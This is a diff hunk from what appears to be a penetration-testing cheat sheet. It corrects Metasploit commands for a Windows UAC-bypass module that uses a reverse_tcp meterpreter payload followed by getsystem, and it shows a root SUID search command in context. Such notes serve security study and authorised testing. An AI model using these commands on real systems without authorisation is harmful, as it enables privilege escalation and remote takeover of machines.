@@ -908,15 +908,16 @@ find / -user root -perm -4000 -exec ls -ldb {} \;
 [<< Index](#Index)
 ```
 use exploit/windows/local/bypassuac_injection
-set windows/x64/meterpreter/reverse_tcp
+set payload windows/x64/meterpreter/reverse_tcp
 set SESSION <session_id>
 set LPORT <port>
-set TARGET WINDOWS\ x64
+set target 1
 
 meterpreter > getsystem
 ```
 - Need to have a 64-bit meterpreter session (session_1).
 - Change `LPORT` to avoid conflict with existing session(s).
+- Set `target` to `1` (Windows x64)
 - In session_2, `getsystem` works because UAC flag is no longer set.
 
 
